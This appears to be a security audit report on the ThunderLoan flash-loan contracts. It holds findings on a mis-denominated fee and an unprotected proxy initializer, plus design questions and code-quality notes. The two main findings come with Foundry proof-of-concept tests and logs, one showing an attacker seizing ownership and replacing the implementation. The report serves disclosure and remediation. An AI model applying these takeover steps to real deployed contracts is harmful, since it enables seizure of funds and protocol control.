### [H-1] The fee is denominated in WETH but treated as token units in `ThunderLoan::getCalculatedFee`, so every token is charged the wrong fee

**Description::**
`getCalculatedFee` converts the borrowed amount into WETH value and takes the fee from that value:

```javascript
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
```

The fee that comes out is an amount of **WETH**, but `flashloan` uses it as if it were an amount of the borrowed **token**:

```javascript
uint256 fee = getCalculatedFee(token, amount);
...
uint256 endingBalance = token.balanceOf(address(assetToken));
if (endingBalance < startingBalance + fee) {
    revert ThunderLoan__NotPaidBack(startingBalance + fee, endingBalance);
}
```

The repayment check, the `FlashLoan` event and `assetToken.updateExchangeRate(fee)` all treat the number as token units, so the two only agree when the token is worth exactly `1e18`. The client's `MockTSwapPool` hardcodes a price of `1e18`, which is why the existing tests never caught it.

**Impact::**
Every token that is not worth exactly 1 WETH is charged the wrong fee. A token worth `0.01` WETH is charged 100x less than the advertised 0.3%, so the borrower pays almost nothing and the liquidity providers lose the yield, while a token worth more than 1 WETH is charged far more than 0.3%. In the PoC the fee on a 10 token loan comes out as `0.0003` tokens instead of `0.03`.

**Proof of Concept::**
Check the `test_CalculatedFeeIsDenominatedInWeth_AUDIT` test in the `ThunderLoanTest.t.sol` file:
<details>
<summary>Here's the full code</summary>

```javascript
    // the H-1: getCalculatedFee returns the fee in WETH value, but flashloan expects it in token units
    function test_CalculatedFeeIsDenominatedInWeth_AUDIT() public setAllowedToken hasDeposits {
        uint256 amountToBorrow = AMOUNT;

        // the mock pool hardcodes a price of 1e18, which hides the bug, so set a real one:
        // this token is worth 0.01 WETH, not 1 WETH
        uint256 price = 0.01e18;
        MockTSwapPool pool = MockTSwapPool(mockPoolFactory.getPool(address(tokenA)));
        vm.mockCall(
            address(pool),
            abi.encodeWithSelector(MockTSwapPool.getPriceOfOnePoolTokenInWeth.selector),
            abi.encode(price)
        );

        uint256 fee = thunderLoan.getCalculatedFee(tokenA, amountToBorrow);

        // the fee should be 0.3% of the borrowed token amount
        uint256 intendedFee = (amountToBorrow * thunderLoan.getFee()) / thunderLoan.getFeePrecision();

        // instead it is 0.3% of the WETH value, treated as if it were tokens
        uint256 valueInWeth = (amountToBorrow * price) / thunderLoan.getFeePrecision();
        uint256 wronglyDenominatedFee = (valueInWeth * thunderLoan.getFee()) / thunderLoan.getFeePrecision();

        console2.log("intended fee in token units:", intendedFee);
        console2.log("fee the contract charges:", fee);
        assertEq(fee, wronglyDenominatedFee);
        assertEq(fee, intendedFee / 100);

        // and the protocol really accepts this reduced fee on a real flash loan
        vm.startPrank(user);
        tokenA.mint(address(mockFlashLoanReceiver), AMOUNT);
        thunderLoan.flashloan(address(mockFlashLoanReceiver), tokenA, amountToBorrow, "");
        vm.stopPrank();

        AssetToken assetToken = thunderLoan.getAssetFromToken(tokenA);
        console2.log("asset token balance after the loan:", tokenA.balanceOf(address(assetToken)));
        console2.log("receiver paid in fees:", AMOUNT - mockFlashLoanReceiver.getBalanceAfter());

        // the pool grew by the wrongly denominated fee, not by the intended one
        assertEq(
            tokenA.balanceOf(address(assetToken)),
            DEPOSIT_AMOUNT + fee
        );
        assertEq(AMOUNT - mockFlashLoanReceiver.getBalanceAfter(), fee);
        assertLt(fee, intendedFee);
    }
```

</details>
You can run it via

```bash
forge test --mt test_CalculatedFeeIsDenominatedInWeth_AUDIT -vv
```
and you will see something like this:

```text
Logs:
  intended fee in token units: 30000000000000000
  fee the contract charges: 300000000000000
  asset token balance after the loan: 1000000300000000000000
  receiver paid in fees: 300000000000000
```
A 10 token loan should cost `0.03` tokens in fees and the protocol charges `0.0003`, and the live flash loan in the same test accepts that reduced repayment.

**Recommended Solution::**
1. Take the fee as a percentage of the borrowed amount, in the token's own units, and drop the price conversion from the fee path:

```diff
-        uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
-        fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
+        fee = (amount * s_flashLoanFee) / s_feePrecision;
```

2. If the fee is meant to be collected in WETH terms instead, then the repayment check, the event and the exchange rate update all have to be denominated in WETH too, and the natspec has to say which unit the fee is in.
___
### [L-1] Unprotected initializer in `ThunderLoan::initialize`, the proxy can be initialized by anyone and the deploy script never calls it

**Description::**
`initialize` is external with no access control, and it sets both the owner and the pool factory the fee maths depends on:

```javascript
function initialize(address tswapAddress) external initializer {
    __Ownable_init(msg.sender);
    __UUPSUpgradeable_init();
    __Oracle_init(tswapAddress);
    s_feePrecision = 1e18;
    s_flashLoanFee = 3e15; // 0.3% ETH fee
}
```

Until it is called, any address can call it on the proxy, and that caller becomes the owner and picks the pool factory. The `_disableInitializers()` in the constructor only protects the implementation contract, not the proxy, and the deploy script never initializes the proxy at all:

```javascript
ThunderLoan thunderLoan = new ThunderLoan();
new ERC1967Proxy(address(thunderLoan), "");
```

The empty init data means no initialization happens at deployment, so the proxy stays open.

**Impact::**
The first caller becomes the owner of the protocol, can point the oracle at a pool factory they control, change the flash loan fee, allow tokens, and because the owner is also the upgrade authority, replace the implementation entirely.

**Proof of Concept::**
Check the `test_AnyoneCanInitializeProxy_AUDIT` test in the `ThunderLoanTest.t.sol` file:
<details>
<summary>Here's the full code</summary>

```javascript
    // the L-1: the deploy script never calls initialize, so anyone can initialize the proxy,
    // become the owner and replace the implementation
    function test_AnyoneCanInitializeProxy_AUDIT() public {
        // exactly what script/DeployThunderLoan.s.sol does, no initialize call
        ThunderLoan implementation = new ThunderLoan();
        ERC1967Proxy freshProxy = new ERC1967Proxy(address(implementation), "");
        ThunderLoan uninitializedProxy = ThunderLoan(address(freshProxy));

        // the proxy is live, but it has no owner and no pool factory
        console.log("owner before:", uninitializedProxy.owner());
        console.log("pool factory before:", uninitializedProxy.getPoolFactoryAddress());
        assertEq(uninitializedProxy.owner(), address(0));
        assertEq(uninitializedProxy.getPoolFactoryAddress(), address(0));

        // an attacker initializes it first and becomes the owner
        address attacker = makeAddr("attacker");
        MockPoolFactory attackerFactory = new MockPoolFactory();

        vm.prank(attacker);
        uninitializedProxy.initialize(address(attackerFactory));

        console.log("owner after:", uninitializedProxy.owner());
        assertEq(uninitializedProxy.owner(), attacker);
        assertEq(
            uninitializedProxy.getPoolFactoryAddress(),
            address(attackerFactory)
        );

        // the deployer can never take it back, the initializer is spent
        vm.expectRevert();
        uninitializedProxy.initialize(address(mockPoolFactory));

        // and the attacker owns every onlyOwner function, the fee for example
        vm.prank(attacker);
        uninitializedProxy.updateFlashLoanFee(1e18);
        console2.log("fee set by attacker:", uninitializedProxy.getFee());
        assertEq(uninitializedProxy.getFee(), 1e18);

        // the owner is also the upgrade authority, so the implementation can be replaced
        ThunderLoan maliciousImplementation = new ThunderLoan();
        vm.prank(attacker);
        uninitializedProxy.upgradeToAndCall(address(maliciousImplementation), "");

        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
        address newImplementation = address(
            uint160(uint256(vm.load(address(freshProxy), implementationSlot)))
        );
        console.log("implementation after attacker upgrade:", newImplementation);
        assertEq(newImplementation, address(maliciousImplementation));
    }
```

</details>
You can run it via

```bash
forge test --mt test_AnyoneCanInitializeProxy_AUDIT -vv
```
and you will see something like this:

```text
Logs:
  owner before: 0x0000000000000000000000000000000000000000
  pool factory before: 0x0000000000000000000000000000000000000000
  owner after: 0x9dF0C6b0066D5317aA5b38B36850548DaCCa6B4e
  fee set by attacker: 1000000000000000000
  implementation after attacker upgrade: 0x212224D2F2d262cd093eE13240ca4873fcCBbA3C
```
The proxy starts with no owner and no pool factory, the attacker initializes it first and becomes the owner, the deployer can no longer initialize it, and the attacker then sets the fee and replaces the implementation through `upgradeToAndCall`.

**Recommended Solution::**
1. Initialize the proxy in the same transaction as its deployment, instead of leaving it open:

```diff
-        ThunderLoan thunderLoan = new ThunderLoan();
-        new ERC1967Proxy(address(thunderLoan), "");
+        ThunderLoan thunderLoan = new ThunderLoan();
+        new ERC1967Proxy(
+            address(thunderLoan),
+            abi.encodeCall(ThunderLoan.initialize, (tswapAddress))
+        );
```

2. Keep the `_disableInitializers()` in the constructor, it is correct and stops the implementation contract itself from being initialized.
___
### [Q-1] Every asset is priced only through its own TSwap WETH pool in `OracleUpgradeable::getPriceInWeth`, is a single price source the intended design?

**Description::**
`getPriceInWeth` asks the factory for the token's pool and then reads exactly one price from it:

```javascript
address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
```

So every allowed token is priced by its own TSwap WETH pool, and that single number feeds `getCalculatedFee`. There is no second source, no freshness check and no check on how deep that pool is. Is pricing every asset this way the intended design, and what should happen for a token whose WETH pool is thin, or whose pool does not exist yet?
___
### [Q-2] The protocol's fee maths depends on TSwap, is a less proven AMM the intended price source?

**Description::**
`IPoolFactory` is TSwap's factory, and the protocol routes all of its pricing through it. The fee for every flash loan is derived from that price:

```javascript
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
```

That makes protocol revenue depend on an AMM that is newer and smaller than Uniswap, and on the `s_poolFactory` address chosen in `initialize`. Why was TSwap chosen over a more established venue, and is the team comfortable with a single young AMM as the price source for the fee?
___
### [Q-3] Allowed tokens can be frozen by a centralized issuer, what happens if Circle blocks the protocol?

**Description::**
The protocol holds the underlying token inside the `AssetToken` contract and moves it with `safeTransfer`:

```javascript
function transferUnderlyingTo(address to, uint256 amount) external onlyThunderLoan {
    i_underlying.safeTransfer(to, amount);
}
```

For a token like USDC the issuer can blacklist an address, and a blocked address can neither send nor receive. If Circle blocks the `AssetToken` or a flash loan receiver, every transfer for that asset reverts, which stops deposits, flash loans and repayments for that token while the rest of the protocol keeps working. The client's known issues list mentions weird ERC20s, but not a token with a freeze function. Should tokens that can freeze addresses be allowed at all, and is there a plan for that case?
___
### [I-1] Unused import in `IFlashLoanReceiver`, the interface imports `IThunderLoan` and never uses it

**Description::**
The interface imports a contract it never references, so the import is dead code:

```javascript
import {IThunderLoan} from "./IThunderLoan.sol";
```

`IFlashLoanReceiver` only declares `executeOperation`, so `IThunderLoan` adds nothing here.
___
### [I-2] Missing natspec on almost the whole public surface in the interfaces, `AssetToken`, `OracleUpgradeable`, `ThunderLoan` and `ThunderLoanUpgraded`

**Description::**
Only a handful of functions carry `///` documentation. Everywhere else the parameters and return values are undefined, so an integrator or a reviewer has to read the body to guess what they mean. The callback is the clearest example, and none of its parameters are described:

```javascript
function executeOperation(
    address token,
    uint256 amount,
    uint256 fee,
    address initiator,
    bytes calldata params
) external returns (bool);
```

Nothing says whether `amount` is the borrowed amount or the borrowed amount plus the fee, or what `initiator` and `params` are for. The same gap runs through the rest of the protocol:

| File | Functions with no natspec |
|---|---|
| `interfaces/IFlashLoanReceiver.sol` | `executeOperation` |
| `interfaces/IPoolFactory.sol` | `getPool` |
| `interfaces/ITSwapPool.sol` | `getPriceOfOnePoolTokenInWeth` |
| `interfaces/IThunderLoan.sol` | `repay` |
| `protocol/AssetToken.sol` | `mint`, `burn`, `transferUnderlyingTo`, `updateExchangeRate`, `getExchangeRate`, `getUnderlying` |
| `protocol/OracleUpgradeable.sol` | `__Oracle_init`, `__Oracle_init_unchained`, `getPriceInWeth`, `getPrice`, `getPoolFactoryAddress` |
| `protocol/ThunderLoan.sol` | `deposit`, `flashloan`, `repay`, `setAllowedToken`, `getCalculatedFee`, `updateFlashLoanFee`, `isAllowedToken`, `getAssetFromToken`, `isCurrentlyFlashLoaning`, `getFee`, `getFeePrecision`, `_authorizeUpgrade` |
| `upgradedProtocol/ThunderLoanUpgraded.sol` | the same public surface as `ThunderLoan` |

That is 38 functions across five files with nothing describing their inputs, their outputs or why they exist. The protocol is upgradeable and integrates with external flash loan receivers, so the missing docs hit both the integrators and the team that has to review the next upgrade.
___
### [I-3] `IThunderLoan` is never implemented and its `repay` type does not match `ThunderLoan`, so the interface cannot be trusted as the protocol ABI

**Description::**
The interface declares:

```javascript
function repay(address token, uint256 amount) external;
```

but nothing implements it. `ThunderLoan` inherits `Initializable, OwnableUpgradeable, UUPSUpgradeable, OracleUpgradeable`, not `IThunderLoan`, and its own function takes a different type:

```javascript
function repay(IERC20 token, uint256 amount) public {
```

The ABI selector ends up the same because `IERC20` encodes as `address`, so the mismatch is invisible on-chain, but no compiler check keeps the interface and the contract in sync. Either make `ThunderLoan` implement `IThunderLoan`, or align the type and treat the interface as the source of truth.
___
### [I-4] Missing zero address check in `OracleUpgradeable::__Oracle_init`, a bad pool factory breaks all pricing instead of reverting at setup

**Description::**
The initializer stores the pool factory with no validation:

```javascript
function __Oracle_init_unchained(
    address poolFactoryAddress
) internal onlyInitializing {
    s_poolFactory = poolFactoryAddress;
}
```

So a zero or wrong address is accepted while the protocol is being set up. Every price read afterwards goes through it:

```javascript
address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
```

which means `getPriceInWeth`, and therefore the fee calculation used on deposits and flash loans, fails for every token. Validating the address at initialization turns a silent misconfiguration into a revert at setup time.

